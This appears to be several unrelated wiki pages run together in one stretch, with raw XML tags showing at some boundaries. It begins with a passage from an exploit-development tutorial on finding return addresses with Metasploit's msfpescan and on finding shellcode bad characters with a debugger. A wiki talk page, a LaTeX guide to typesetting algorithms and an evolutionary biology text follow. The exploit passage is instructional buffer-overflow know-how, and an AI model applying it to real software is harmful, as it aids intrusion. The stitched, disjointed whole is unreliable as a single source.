&lt;br&gt;
And, once again, the Metasploit Framework includes tools to help us.
&lt;br&gt;
&lt;br&gt;
We can use 'msfpescan' to search return addresses for an opcode:
&lt;br&gt;
 $ ./framework/msfpescan
 Usage: ./framework/msfpescan [mode] &lt;options&gt; [targets]
 
 Modes:
     -j, --jump [regA,regB,regC]      Search for jump equivalent instructions
     -p, --poppopret                  Search for pop+pop+ret combinations
     -r, --regex [regex]              Search for regex match
     -a, --analyze-address [address]  Display the code at the specified address
     -b, --analyze-offset [offset]    Display the code at the specified offset
     -f, --fingerprint                Attempt to identify the packer/compiler
 
 Options:
     -M, --memdump                    The targets are memdump.exe directories
     -A, --after [bytes]              Number of bytes to show after match (-a/-b)
 
     -B, --before [bytes]             Number of bytes to show before match (-a/-b
 )
     -I, --image-base [address]       Specify an alternate ImageBase
     -h, --help                       Show this message


We can also use the MSF Opcodes Database:
&lt;br&gt;
http://metasploit.com/users/opcode/msfopcode.cgi
&lt;br&gt;
Note that the Metasploit Framework includes a built-in client to use this database:
&lt;br&gt;
http://www.metasploit.com/projects/Framework/msf3/msfopcode.html
&lt;br&gt;&lt;br&gt;
We can also use another nice tool called eereap from eEye:&lt;br&gt;
http://research.eeye.com/html/tools/RT20060801-2.html&lt;br&gt;&lt;br&gt;
We can also find some international return addresses here:&lt;br&gt;
https://www.securinfos.info/international-opcodes/index.php

===== Dealing with badchars =====

We have now to find and prevent badchars.
&lt;br&gt;
We should not include terminating null character in our shellcode as it would break out of the execution.
&lt;br&gt;
''We have already done this with this in our exploit: 'BadChars' =&gt; &quot;\x00&quot; ''
&lt;br&gt;&lt;br&gt;
Additionally, a target application will often modify the data received before the application will work with the data.
&lt;br&gt;
An example is an application that will change all characters to uppercase.
&lt;br&gt;
As this will modify our shellcode, we have to deal with it.
&lt;br&gt;
For this, the Metasploit Framework will encode our shellcode to obtain one without any specified badchars.
&lt;br&gt;
We just have to specify the list of badchars in our exploit code.
&lt;br&gt;
&lt;br&gt;
So, to find the badchars, we will send a string containing all the characters of the ASCII table, with both printable and non-printable ones.
&lt;br&gt;
The string will look like this:
&lt;br&gt;
 &quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e&lt;br&gt;
 \x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d&lt;br&gt;
 \x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c&lt;br&gt;
 \x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b&lt;br&gt;
 \x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a&lt;br&gt;
 \x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9&lt;br&gt;
 \xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8&lt;br&gt;
 \xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7&lt;br&gt;
 \xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;
&lt;br&gt;
@ We edit our exploit code and put the above string in it.
&lt;br&gt;
Then, having our target application running and our debugger attached to its process; we relaunch our exploit.
&lt;br&gt;
Under the debugger, after the access violation is triggered, we right click on the esp register and choose the option &quot;follow in dump&quot;.
&lt;br&gt;
We will now see our string and check what are the missing or modified characters at the end of the string.
&lt;br&gt;
It is our first badchars. (note it)
&lt;br&gt;&lt;br&gt;
We remove it in our exploit code, and do it@ again...&lt;br&gt;
until we see all the characters sended in our debugger.
&lt;br&gt;&lt;br&gt;
Now we write, in the badchars section of our exploit, the characters found as badchars (removed or modified by the application).

      <text xml:space="preserve">== Thank you== 

Thank you for your edits to the matlab module, I agree the octave comparison could use some NPOV-type cleanup; I hope to expand/improve the articles at some later time but my knowledge of the subject is somewhat limited (I don't know how to do several of the things that are listed on the TOC but are stubs, like writing to ports and object-oriented programming) so it's always good to have someone else around. Good luck in your endeavors. [[User:Mattb112885|Mattb112885]] &lt;small&gt;([[User talk:Mattb112885|talk]]) &lt;/small&gt; 23:40, 24 March 2007 (UTC)
:Hi Matt, thanks for the support ;) - I've now done my editing on that page so feel free to make any changes you'd like --[[User:Mcld|Mcld]] 00:01, 25 March 2007 (UTC)
:: Your edits look really good, I made some minor modifications but you changed most of the NPOV issues I think. Regards. [[User:Mattb112885|Mattb112885]] &lt;small&gt;([[User talk:Mattb112885|talk]]) &lt;/small&gt; 00:21, 25 March 2007 (UTC)

== Zine making ==

Hi, I just wanted to say thanks for creating this Wikibook. I really enjoyed reading it. Well laid out and good photographs. :) [[User:Pfctdayelise|pfctdayelise]] ([[User talk:Pfctdayelise|talk]]) 12:22, 4 June 2008 (UTC)

=== [[Zine Making]] Edits ===

I made a few edits to Zine Making, in order to make it a little bit more visually appealing in some places. Take a look at what I've done and make sure I didn't ruin your masterpiece! --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 20:41, 21 November 2008 (UTC)</text>

      <comment>/* Typesetting using the algorithm2e package */</comment>
      <text xml:space="preserve">&lt;noinclude&gt;{{LaTeX/Top}}&lt;/noinclude&gt;

LaTeX has several packages for typesetting algorithms in form of &quot;[[w:pseudocode|pseudocode]]&quot;.  They provide stylistic enhancements over a uniform style (i.e., all in typewriter font) so that constructs such as loops or conditionals are visually separated from other text. For typesetting ''real'' code, written in a ''real'' programming language, consider the ''listings'' package described in [[LaTeX/Source Code Listings|Source Code Listings]].

==Typesetting using the &lt;tt&gt;algorithmic&lt;/tt&gt; package==
The &lt;tt&gt;algorithmic&lt;/tt&gt; package uses a different set of commands than the &lt;tt&gt;algorithmicx&lt;/tt&gt; package. This is not compatible with &lt;tt&gt;revtex4-1&lt;/tt&gt;.
Basic commands are:
&lt;source lang=&quot;latex&quot;&gt;
 \STATE &lt;text&gt;
 \IF{&lt;condition&gt;} \STATE{&lt;text&gt;} \ENDIF
 \FOR{&lt;condition&gt;} \STATE{&lt;text&gt;} \ENDFOR
 \FOR{&lt;condition&gt; \TO &lt;condition&gt; } \STATE{&lt;text&gt;} \ENDFOR
 \FORALL{&lt;condition&gt;} \STATE{&lt;text&gt;} \ENDFOR
 \WHILE{&lt;condition&gt;} \STATE{&lt;text&gt;} \ENDWHILE
 \REPEAT \STATE{&lt;text&gt;} \UNTIL{&lt;condition&gt;}
 \LOOP \STATE{&lt;text&gt;} \ENDLOOP
 \REQUIRE &lt;text&gt;
 \ENSURE &lt;text&gt;
 \RETURN &lt;text&gt;
 \PRINT &lt;text&gt;
 \COMMENT{&lt;text&gt;}
 \AND, \OR, \XOR, \NOT, \TO, \TRUE, \FALSE
&lt;/source&gt;
Complete documentation is listed at [http://mirror.ctan.org/tex-archive/macros/latex/contrib/algorithms/algorithms.pdf]. Most commands are similar to the &lt;tt&gt;algorithmicx&lt;/tt&gt; equivalents, but with different capitalization.
The package &lt;tt&gt;algorithms bundle&lt;/tt&gt; at the [http://mirror.ctan.org/tex-archive/macros/latex/contrib/algorithms/ ctan repository], dated 2009-08-24, describes both the &lt;tt&gt;algorithmic&lt;/tt&gt; environment (for typesetting algorithms) and the &lt;tt&gt;algorithm&lt;/tt&gt; floating wrapper (see [[#The_algorithm_environment|below]]) which is designed to wrap around the algorithmic environment.

The &lt;tt&gt;algorithmic&lt;/tt&gt; package is suggested for [http://ieeexplore.ieee.org/xpl/periodicals.jsp IEEE journals] as it is a part of their default style sheet.&lt;ref&gt;[http://www.ctan.org/tex-archive/macros/latex/contrib/IEEEtran]&lt;/ref&gt;

==Typesetting using the &lt;tt&gt;algorithm2e&lt;/tt&gt; package==
The &lt;tt&gt;algorithm2e&lt;/tt&gt; package (first released 1995, latest updated January 2013 according to the [http://mirror.ctan.org/tex-archive/macros/latex/contrib/algorithm2e/doc/algorithm2e.pdf v5.0 manual]) allows typesetting algorithms with a lot of customization. Like &lt;tt&gt;algorithmic&lt;/tt&gt;, this package is also not compatible with Revtex-4.1.&lt;ref&gt;http://tex.stackexchange.com/questions/70181/revtex4-1-and-algorithm2e-indentation-clash&lt;/ref&gt;

Unlike &lt;tt&gt;algorithmic&lt;/tt&gt;, &lt;tt&gt;algorithm2e&lt;/tt&gt; provides a relatively huge number of customization options to the algorithm suiting to the needs of various users.
The [http://mirror.ctan.org/tex-archive/macros/latex/contrib/algorithm2e/doc/algorithm2e.pdf CTAN-manual] provides a comprehensible list of examples and full set of controls.

Typically, the usage between &lt;tt&gt;\begin{algorithm}&lt;/tt&gt; and &lt;tt&gt;\end{algorithm}&lt;/tt&gt; would be &lt;br/&gt;
1. Declaring a set of keywords(to typeset as functions/operators), layout controls, caption, title, header text (which appears before the algorithm's main steps e.g.: Input,Output) &lt;br/&gt;
2. Writing the main steps of the algorihtm, with each step ending with a \; &lt;br/&gt;
This may be taken in analogy with writing a latex-preamble before we start the actual document.

The package is loaded like
&lt;source lang=&quot;latex&quot;&gt;\usepackage[]{algorithm2e}&lt;/source&gt;
and a simple example, taken from the v4.01 manual, is
&lt;source lang=&quot;latex&quot;&gt;
\begin{algorithm}[H]
 \KwData{this text}
 \KwResult{how to write algorithm with \LaTeX2e }
 initialization\;
 \While{not at end of this document}{
  read current\;
  \eIf{understand}{
   go to next section\;
   current section becomes this one\;
   }{
   go back to the beginning of current section\;
  }
 }
 \caption{How to write algorithms}
\end{algorithm}&lt;/source&gt;
which produces

More details are in the manual hosted on the [http://mirror.ctan.org/tex-archive/macros/latex/contrib/algorithm2e/doc/algorithm2e.pdf ctan website].

==Typesetting using the &lt;tt&gt;algorithmicx&lt;/tt&gt; package==

The &lt;tt&gt;algorithmicx&lt;/tt&gt; package provides a number of popular constructs for algorithm designs.  Put &lt;tt&gt;\usepackage{algpseudocode}&lt;/tt&gt; in the preamble to use the algorithmic environment to write algorithm pseudocode (&lt;tt&gt;\begin{algorithmic}...\end{algorithmic}&lt;/tt&gt;).  You might want to use the algorithm environment (&lt;tt&gt;\usepackage{algorithm}&lt;/tt&gt;) to wrap your algorithmic code in an algorithm environment (&lt;tt&gt;\begin{algorithm}...\end{algorithm}&lt;/tt&gt;) to produce a floating environment with numbered algorithms.

The command &lt;tt&gt;\begin{algorithmic}&lt;/tt&gt; can be given the optional argument of a positive integer, which if given will cause line numbering to occur at multiples of that integer. E.g. &lt;tt&gt;\begin{algorithmic}[5]&lt;/tt&gt; will enter the algorithmic environment and number every fifth line.

Below is an example of typesetting a basic algorithm using the &lt;tt&gt;algorithmicx&lt;/tt&gt; package (remember to add the &lt;tt&gt;\usepackage{algpseudocode}&lt;/tt&gt; statement to your document preamble):

&lt;source lang=&quot;latex&quot;&gt;
\begin{algorithmic}
\If {$i\geq maxval$}
    \State $i\gets 0$
\Else
    \If {$i+k\leq maxval$}
        \State $i\gets i+k$
    \EndIf
\EndIf
\end{algorithmic}
&lt;/source&gt;

The LaTeX source can be written to a format familiar to programmers so that it is easy to read. This will not, however, affect the final layout in the document.

[[File:Latex-algorithmic-if-else.png|300px]]

Basic commands have the following syntax:

Statement (\State causes a new line, can also be used in front of other commands)
&lt;source lang=&quot;latex&quot;&gt;\State $x\gets &lt;value&gt;$&lt;/source&gt;

Three forms of if-statements:
&lt;source lang=&quot;latex&quot;&gt;\If{&lt;condition&gt;} &lt;text&gt; \EndIf&lt;/source&gt;
&lt;source lang=&quot;latex&quot;&gt;\If{&lt;condition&gt;} &lt;text&gt; \Else &lt;text&gt; \EndIf&lt;/source&gt;
&lt;source lang=&quot;latex&quot;&gt;\If{&lt;condition&gt;} &lt;text&gt; \ElsIf{&lt;condition&gt;} &lt;text&gt; \Else &lt;text&gt; \EndIf&lt;/source&gt;
The third form accepts as many &lt;tt&gt;\ElsIf{}&lt;/tt&gt; clauses as required. Note that it is &lt;tt&gt;\ElsIf&lt;/tt&gt; and not &lt;tt&gt;\ElseIf&lt;/tt&gt;.

Loops:
&lt;source lang=&quot;latex&quot;&gt;\For{&lt;condition&gt;} &lt;text&gt; \EndFor&lt;/source&gt;
&lt;source lang=&quot;latex&quot;&gt;\ForAll{&lt;condition&gt;} &lt;text&gt; \EndFor&lt;/source&gt;
&lt;source lang=&quot;latex&quot;&gt;\While{&lt;condition&gt;} &lt;text&gt; \EndWhile&lt;/source&gt;
&lt;source lang=&quot;latex&quot;&gt;\Repeat &lt;text&gt; \Until{&lt;condition&gt;}&lt;/source&gt;
&lt;source lang=&quot;latex&quot;&gt;\Loop &lt;text&gt; \EndLoop&lt;/source&gt;

Pre- and postcondition:
&lt;source lang=&quot;latex&quot;&gt;\Require &lt;text&gt;&lt;/source&gt;
&lt;source lang=&quot;latex&quot;&gt;\Ensure &lt;text&gt;&lt;/source&gt;

Functions
&lt;source lang=&quot;latex&quot;&gt;\Function{&lt;name&gt;}{&lt;params&gt;} &lt;body&gt; \EndFunction&lt;/source&gt;
&lt;source lang=&quot;latex&quot;&gt;\Return &lt;text&gt;&lt;/source&gt;
&lt;source lang=&quot;latex&quot;&gt;\Call{&lt;name&gt;}{&lt;params&gt;}&lt;/source&gt;

This command will usually be used in conjunction with a &lt;tt&gt;\State&lt;/tt&gt; command as follows:
&lt;source lang=&quot;latex&quot;&gt;
\Function{Increment}{$a$}
    \State $a \gets a+1$
    \State \Return $a$
\EndFunction
&lt;/source&gt;

Comments:
&lt;source lang=&quot;latex&quot;&gt;\Comment{&lt;text&gt;}&lt;/source&gt;

Note to users who switched from the old &lt;tt&gt;algorithmic&lt;/tt&gt; package: comments may be placed everywhere in the source; there are no limitations as in the old &lt;tt&gt;algorithmic&lt;/tt&gt; package.

=== Renaming things: algorithm to procedure, require/ensure to input/output ===

&lt;source lang=&quot;latex&quot;&gt;
\floatname{algorithm}{Procedure}
\renewcommand{\algorithmicrequire}{\textbf{Input:}}
\renewcommand{\algorithmicensure}{\textbf{Output:}}
&lt;/source&gt;

=== Custom algorithmic blocks ===

The &lt;tt&gt;algorithmicx&lt;/tt&gt; package allows you to define your own environments.

To define blocks beginning with a starting command and ending with an ending command, use
&lt;source lang=&quot;latex&quot;&gt;\algblock[&lt;block&gt;]{&lt;start&gt;}{&lt;end&gt;}&lt;/source&gt;
This defines two commands &lt;tt&gt;\&lt;start&gt;&lt;/tt&gt; and &lt;tt&gt;\&lt;end&gt;&lt;/tt&gt; which have no parameters. The text displayed by them is &lt;tt&gt;\textbf{&lt;start&gt;}&lt;/tt&gt; and &lt;tt&gt;\textbf{&lt;end&gt;}&lt;/tt&gt;.

With &lt;tt&gt;\algblockdefx&lt;/tt&gt; you can give the text to be output by the starting and ending command and the number of parameters for these commands. In the text the n-th parameter is referenced by &lt;tt&gt;#n&lt;/tt&gt;.
&lt;source lang=&quot;latex&quot;&gt;
\algblockdefx[&lt;block&gt;]{&lt;start&gt;}{&lt;end&gt;}
    [&lt;startparamcount&gt;][&lt;default value&gt;]{&lt;start text&gt;}
    [&lt;endparamcount&gt;][&lt;default value&gt;]{&lt;end text&gt;}
&lt;/source&gt;

Example:
&lt;source lang=&quot;latex&quot;&gt;
\algblock[Name]{Start}{End}
\algblockdefx[NAME]{START}{END}%
    [2][Unknown]{Start #1(#2)}%
    {Ending}
\algblockdefx[NAME]{}{OTHEREND}%
    [1]{Until (#1)}
\begin{algorithmic}
\Start
    \Start
        \START[One]{x}
        \END
        \START{0}
        \OTHEREND{\texttt{True}}
    \End
    \Start
    \End
\End
\end{algorithmic}
&lt;/source&gt;

More advanced customization and other constructions are described in the &lt;tt&gt;algorithmicx&lt;/tt&gt; manual: http://mirror.ctan.org/macros/latex/contrib/algorithmicx/algorithmicx.pdf

== The &lt;tt&gt;algorithm&lt;/tt&gt; environment ==

It is often useful for the algorithm produced by &lt;tt&gt;algorithmic&lt;/tt&gt; to be &quot;floated&quot; to the optimal point
in the document to avoid it being split across pages. The &lt;tt&gt;algorithm&lt;/tt&gt; environment provides this and a few other useful features. Include it by adding the &lt;br&gt;
&lt;tt&gt;\usepackage{algorithm}&lt;/tt&gt;
to your document's preamble. It is entered into by
&lt;source lang=&quot;latex&quot;&gt;
\begin{algorithm}
\caption{&lt;your caption for this algorithm&gt;}
\label{&lt;your label for references later in your document&gt;}
\begin{algorithmic}
&lt;algorithmic environment&gt;
\end{algorithmic}
\end{algorithm}
&lt;/source&gt;

=== Algorithm numbering ===
The default numbering system for the &lt;tt&gt;algorithm&lt;/tt&gt; package is to number algorithms sequentially. This is often not desirable, particularly in large documents where numbering according to chapter is more appropriate. The numbering of algorithms can be influenced by providing the name of the document component within which numbering should be recommenced. The legal values for this option are: part, chapter, section, subsection, subsubsection or nothing (default). For example:
&lt;source lang=&quot;latex&quot;&gt;
\usepackage[chapter]{algorithm}
&lt;/source&gt;

=== List of algorithms===

When you use figures or tables, you can add a list of them close to the table of contents; the &lt;tt&gt;algorithm&lt;/tt&gt; package provides a similar command. Just put
&lt;source lang=&quot;latex&quot;&gt;
\listofalgorithms
&lt;/source&gt;
anywhere in the document, and LaTeX will print a list of the &quot;algorithm&quot; environments in the document with the corresponding page and the caption.

=== An example from the manual ===
This is an example taken from the manual ([[#refOfficialManual|official manual, p.14]])
&lt;source lang=&quot;latex&quot;&gt;
\begin{algorithm}                      % enter the algorithm environment
\caption{Calculate $y = x^n$}          % give the algorithm a caption
\label{alg1}                           % and a label for \ref{} commands later in the document
\begin{algorithmic}                    % enter the algorithmic environment
    \REQUIRE $n \geq 0 \vee x \neq 0$
    \ENSURE $y = x^n$
    \STATE $y \Leftarrow 1$
    \IF{$n &lt; 0$}
        \STATE $X \Leftarrow 1 / x$
        \STATE $N \Leftarrow -n$
    \ELSE
        \STATE $X \Leftarrow x$
        \STATE $N \Leftarrow n$
    \ENDIF
    \WHILE{$N \neq 0$}
        \IF{$N$ is even}
            \STATE $X \Leftarrow X \times X$
            \STATE $N \Leftarrow N / 2$
        \ELSE[$N$ is odd]
            \STATE $y \Leftarrow y \times X$
            \STATE $N \Leftarrow N - 1$
        \ENDIF
    \ENDWHILE
\end{algorithmic}

==Typesetting using the &lt;tt&gt;program&lt;/tt&gt; package==

The &lt;tt&gt;program&lt;/tt&gt; package provides macros for typesetting algorithms.
Each line is set in math mode, so all the indentation and spacing is done automatically. 
The notation  &lt;tt&gt;|variable_name|&lt;/tt&gt; can be used within normal text,
maths expressions or programs to indicate a variable name.
Use &lt;tt&gt;\origbar&lt;/tt&gt; to get a normal &lt;tt&gt;|&lt;/tt&gt; symbol in a program.
The commands &lt;tt&gt;\A&lt;/tt&gt;, &lt;tt&gt;\B&lt;/tt&gt;, &lt;tt&gt;\P&lt;/tt&gt;, &lt;tt&gt;\Q&lt;/tt&gt;, &lt;tt&gt;\R&lt;/tt&gt;, &lt;tt&gt;\S&lt;/tt&gt;, &lt;tt&gt;\T&lt;/tt&gt; and &lt;tt&gt;\Z &lt;/tt&gt;typeset the corresponding bold
letter with the next object as a subscript (eg &lt;tt&gt;\S1&lt;/tt&gt; typesets &lt;tt&gt;{\bf
S$_1$}&lt;/tt&gt; etc). Primes work normally, eg &lt;tt&gt;\S‘‘&lt;/tt&gt;.

Below is an example of typesetting a basic algorithm using the
&lt;tt&gt;program&lt;/tt&gt; package (remember to add the
&lt;tt&gt;\usepackage{program}&lt;/tt&gt; statement to your document
preamble):

&lt;source lang=&quot;latex&quot;&gt;
\begin{program}
\mbox{A fast exponentiation procedure:}
\BEGIN \\ %
  \FOR i:=1 \TO 10 \STEP 1 \DO
     |expt|(2,i); \\ |newline|() \OD %
\rcomment{This text will be set flush to the right margin}
\WHERE
\PROC |expt|(x,n) \BODY
          z:=1;
          \DO \IF n=0 \THEN \EXIT \FI;
             \DO \IF |odd|(n) \THEN \EXIT \FI;
\COMMENT{This is a comment statement};
                n:=n/2; x:=x*x \OD;
             \{ n&gt;0 \};
             n:=n-1; z:=z*x \OD;
          |print|(z) \ENDPROC
\END
\end{program}
&lt;/source&gt;

[[File:LaTeX_program_package_example01.png]]

The commands &lt;tt&gt;\(&lt;/tt&gt; and &lt;tt&gt;\)&lt;/tt&gt; are redefined 
to typeset an algorithm in a minipage, so an algorithm
can appear as a single box in a formula. For example,
to state that a particular action system is equivalent
to a WHILE loop you can write:

&lt;source lang=&quot;latex&quot;&gt;
\[
\( \ACTIONS A:
        A \EQ \IF \B{} \THEN \S{}; \CALL A
                       \ELSE \CALL Z \FI \QE
   \ENDACTIONS \)
\EQT
\( \WHILE \B{} \DO \S{} \OD \)
\]
&lt;/source&gt;

Dijkstra conditionals and loops:
&lt;source lang=&quot;latex&quot;&gt;
\begin{program}
\IF x = 1 \AR y:=y+1
\BAR x = 2 \AR y:=y^2
\utdots
\BAR x = n \AR y:=\displaystyle\sum_{i=1}^n y_i \FI

\DO 2 \origbar x \AND x&gt;0 \AR x:= x/2
\BAR \NOT 2 \origbar x    \AR x:= \modbar{x+3} \OD
\end{program}
&lt;/source&gt;

Loops with multiple exits:
&lt;source lang=&quot;latex&quot;&gt;
\begin{program} 
\DO \DO \IF \B1 \THEN \EXIT \FI;
        \S1;
        \IF \B2 \THEN \EXIT(2) \FI \OD;
    \IF \B1 \THEN \EXIT \FI \OD
\end{program} 
&lt;/source&gt;

A Reverse Engineering Example.

Here's the original program:
&lt;source lang=&quot;latex&quot;&gt;
\begin{program} 
 \VAR \seq{m := 0, p := 0, |last| := `` ''}; 
 \ACTIONS |prog|: 
|prog| \ACTIONEQ %
    \seq{|line| := `` '', m := 0, i := 1};
    \CALL |inhere| \ENDACTION
l \ACTIONEQ %
    i := i+1; 
    \IF (i=(n+1)) \THEN \CALL |alldone| \FI ; 
    m := 1; 
    \IF |item|[i] \neq |last|
        \THEN |write|(|line|); |line| := `` ''; m := 0;
              \CALL |inhere| \FI ; 
    \CALL |more| \ENDACTION
|inhere| \ACTIONEQ %
    p := |number|[i]; |line| := |item|[i];
    |line| := |line| \concat `` '' \concat p;
    \CALL |more| \ENDACTION
|more| \ACTIONEQ %
    \IF (m=1) \THEN p := |number|[i];
    |line| := |line| \concat ``, '' \concat p \FI ; 
    |last| := |item|[i]; 
    \CALL l  \ENDACTION  
|alldone| \ACTIONEQ |write|(|line|); \CALL Z \ENDACTION \ENDACTIONS \END 
\end{program} 
&lt;/source&gt;

And here's the transformed and corrected version:
&lt;source lang=&quot;latex&quot;&gt;
\begin{program} 
\seq{|line| := `` '', i := 1};
\WHILE i \neq n+1 \DO 
  |line| := |item|[i] \concat `` '' \concat |number|[i]; 
  i := i+1; 
  \WHILE i \neq n+1 \AND |item|[i] = |item|[i-1] \DO 
    |line| := |line| \concat ``, '' \concat |number|[i]);
    i := i+1 \OD ; 
  |write|(|line|) \OD 
\end{program}
&lt;/source&gt;

The package also provides a macro for typesetting a set
like this: &lt;tt&gt;\set{x \in N | x &gt; 0}&lt;/tt&gt;.

Lines can be numbered by setting &lt;tt&gt;\NumberProgramstrue&lt;/tt&gt;
and numbering turned off with &lt;tt&gt;\NumberProgramsfalse&lt;/tt&gt;

==Evolutionary Biology==
===Biological Species Concept===
Scientists have long sought to view the great diversity of organisms as a collection of distinct units. The '''species''', as the atomic unit of diversity, represents a group of interbreeding natural populations that are reproductively isolated from other such groups. When individuals breed offspring, the genes of individuals are shuffled within a common gene pool representing the species' identity. The identity of species is based on the ability to breed, rather than on physical similarity. Limited transfer of genes between species causes different species to take on specific appearances and characteristcis.

===Selection and Microevolution===
Individuals will generally show great differences in the number of offspring they mange to contribute to the populations next generation. If differences in individual genotypes affect the bearer's reproductive success, then the frequencies of the genotypes will change over generations; genotypes with higher fitness become more common. 

====Fitness====
Fitness describes an individual's ability to reproduce successfully. relative to that of other members of its population. It measures changes in the proportion of genes from one generation to the next. Genes associated with higher fitness become more common while reduced fitness will decrease theit proportion. Ftness of a genotype is an averaged quantity which reflects the reproductive outcomes of all individuals with that genotype. When fitness measures the relative quantity of gene copies present in individuals of the next generation, they may have arrived there in one of several different ways. An individual may show greater reproductive success becayse it itself reproduced, or it may have helped relatives with similar genes to reproduce.

====Artificial Selection and Breeding====
Consider the work of a professional dog breeder. Lets consider a person trying to obtain a breed that is best suited for hunting of water fowl. The breeder specifically chooses individuals which most closely match the desired traits and selectively breeds them to each other in the hope of obtaining progeny with a combination of useful traits. Such plans can only succeed if:
*phenotypic heritability in morphological and behavioral features is coded by &lt;genes&gt; (e.g. webbed toes, willingness to swim at least partially controlled by genes)
*phenotypic variability is present (some have a particular characteristic, some don't)
*differential survival/reproductive success of phenotypic variants is produced (you pick the ones who do)

Repeated, selective breeding events will alter the proportion of different genes over time. Genes which were present in those individuals that the breeder selected for reproduction will become overrepresented while those that occurred predominantly in discarded individuals will decrease in proportion. Animal breeding is a slow process, however, a combination of strong selection and a high degree of heritability can change the relative abundance of genes in a population up to 10% per generation.

Not all of the selections that we make are done intentionally. Penicillin became widely available during the second world war for the treatment of infected wounds. Just four years after drug companies began mass-producing penicillin in 1943, microbes began appearing that could resist it. With frequent and indiscriminant use of antibiotics we have fostered the emergence of antibiotic resistance in a variety of microorganism. The ability to withstand the effects of an antibiotic occurs when a rare mutation renders a small subset of individuals with lowered sensitivity to the effects of the drug. During the course of antibiotic treatment the wildtype individuals are killed first as intended while the mutants are able to survive a bit longer. If the treatment is stopped before the drug had an opportunity to kill all pathogens regardless of slight differences in sensitivity to it, only resistant individuals will survive and be able to infect new hosts. With each antibiotic treatment that ends prematurely we unintentionally select for those individuals that exhibit a higher ability to tolerate the drug.

====Natural Selection====
Natural selection is the process by which favorable traits that are heritable become more common in successive generations of a population of reproducing organisms, while the proportion of less successful traits shrinks. &quot;Favorable&quot; and &quot;successful&quot; are defined in a purely functional sense as environmental conditions allow some individuals to leave more offspring than others. Selection cannot act on the genes ''per se'' but rather works on their expression into observable characteristics. Individuals with favorable phenotypes are more likely to survive and reproduce then the genotypes associated with favorable phenotyps will increase in frequency with each generation. Over time, this process can result in the emergence of adaptations that specialize a group of organisms for a particular ecological set of conditions (i.e., microevolution). If different subsets of the population adapt to excel in one of multiple, distinct niches, the emergence of any reproductive barriers between the groups may allow the population's split into separate species (i.e., macroevolution).

More offspring are produced than finite resources can support. Individuals thus can be viewed as in a constant struggle for existence. Individuals within a population are rarely clones, they commonly show variation in phenotypes as well as genotypes. Some of this variation in behavioral phenotypes is heritable. As successful variants are more likely to survive and reproduce, their genotypes will be become overrepresented in the next generation

Density-independent and density-dependent growth models: '''Exponential Model''': a species can potentially increase in numbers according to a geometric series -- Thomas Robert Malthus (1766-1834) Logistic Model: the rate of population increase may be limited, i.e. it may depend on population density -- Pierre Verhulst (1838). '''Carrying Capacity''' (K): an environment's maximum persistently supportable load (Catton 1986).

'''Natural selection''' is the process by which environmental effects lead to varying degrees of reproductive success among individuals of a population of organisms with different hereditary characters, or traits. The characters that inhibit reproductive success decrease in frequency from generation to generation. It is the process whereby certain genes (alleles) gain greater representation in the following generations compared to other alleles. '''Adaptations''' are the complement of traits that increases the fitness of the owner. An individual's '''Fitness''' or Reproductive Success is the relative probability that an animal of a particular genotype and phenotype will manage to contribute its genes to the next generation

=====Example: Mimicry=====
A major concern of animals and other critters is to protect themselves from predators in order to survive and reproduce and pass their genes off to a new generation.  Many animals have evolved adaptations known as antipredator devices such as camouflage and chemical toxins.  Animals use camouflage to blend in with their environments in an attempt to be unrecognizable by predators.  Other organisms such as the monarch butterfly contain chemical toxins that are secreted into the predator’s mouth when it attempts to eat the butterfly.  The monarch butterfly also has warning coloration that gives a warning sign to predators to remind them that the butterfly is toxic and should not be eaten.  

These antipredator devices are so successful that other organisms have been known to mimic them.  The organism that is mimicked is known as the model and the third party that is deceived by the model and its mimic is known as the receiver.  The mimics have learned to take advantage of the color patterns and markings that predators have learned by experience to avoid.  The model is usually a species that has an abundant population and has successfully warded off predators with an antipredator device.

Organisms have learned to mimic their surroundings or environment in an attempt to “hide” from predators.  For example, lizards have learned to mimic tree trunk color which proves to be very successful as predators will simply move past them as they believe that they are simply looking at a tree.  Another example of this type of mimicry can be seen with the Katydid who will mimic a leaf in both color and shape in an attempt to be hidden.  

Some prey animals have evolved certain patterns on their bodies that mimic other animals in an attempt to startle their predators.  The most common example of this type of mimicry can be found in some moths and butterflies who flash eye spots on their wings to predators.  These eye spots startle the predator who believes that the eyes belong to a much larger animal that may be a threat to them.

In one form of mimicry known as aggressive mimicry, an organism will mimic a signal that is either deceptive or attractive to its prey.  One example of this involves the praying mantis who will mimic flowers to attract insects that they can then capture and eat.  Organisms can also imitate the behaviors of other organisms.  Moth caterpillars, for example, will imitate the motion and body movements of a snake in order to scare off predators that are usually a prey item for snakes.

